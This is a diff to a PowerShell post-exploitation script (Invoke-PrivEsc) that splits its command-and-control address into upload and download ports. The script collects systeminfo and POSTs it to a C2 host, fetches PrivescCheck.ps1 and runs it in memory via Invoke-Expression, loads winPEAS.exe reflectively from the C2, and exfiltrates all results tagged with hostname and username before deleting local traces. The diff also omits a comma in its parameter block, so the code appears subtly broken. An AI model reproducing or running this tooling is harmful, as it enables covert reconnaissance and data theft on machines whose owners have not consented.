@@ -152,7 +152,14 @@ function Invoke-PrivEsc {
     param(
         [Parameter(Mandatory=$true)]
         [string]$C2
+
+        [int]$Uport = 8080,
+        [int]$Dport = 80
     )
+
+    # Construct C2 URLs
+    $UploadC2 = "$C2`:$Uport"
+    $DownloadC2 = "$C2`:$Dport"
 
     # ----------------------------------------
     # Stealthy temp folder
@@ -164,23 +171,23 @@ function Invoke-PrivEsc {
     # Collect and POST systeminfo (for wes-ng)
     # ----------------------------------------
     $sysInfo = systeminfo | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_systeminfo.txt" | Out-Null
+    Invoke-FileUpload -C2 $UploadC2 -InputString $sysInfo -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_systeminfo.txt" | Out-Null
 
     # ----------------------------------------
     # Run PrivescCheck.ps1 in-memory → POST separately
     # ----------------------------------------
-    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
+    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($DownloadC2)/PrivescCheck.ps1")
     Invoke-Expression $privCheck
     $privCheckHtml = Join-Path $tmp "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck"
     $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
-    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
-    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
+    Invoke-FileUpload -C2 $UploadC2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
+    Invoke-FileUpload -C2 $UploadC2 -FilePath "$privCheckHtml.html" | Out-Null
     Remove-Item "$privCheckHtml.html" -Force
 
     # ----------------------------------------
     # Run winPEAS.exe in memory and exfiltrate output
     # ----------------------------------------
-    $peasUrl = "http://$C2/winpeas.exe"
+    $peasUrl = "http://$DownloadC2/winpeas.exe"
     $wp = [System.Reflection.Assembly]::Load(
         [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
     )
@@ -198,7 +205,7 @@ function Invoke-PrivEsc {
     # Restore console output
     [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
-    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeas.txt" | Out-Null
+    Invoke-FileUpload -C2 $UploadC2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeas.txt" | Out-Null
 }
 
 function Invoke-FileUpload {
@@ -218,7 +225,7 @@ function Invoke-FileUpload {
 
     try {
         # Construct upload URL
-        $Url = "http://$($C2):8080/p"
+        $Url = "http://$($C2)/p"
         $Boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
 
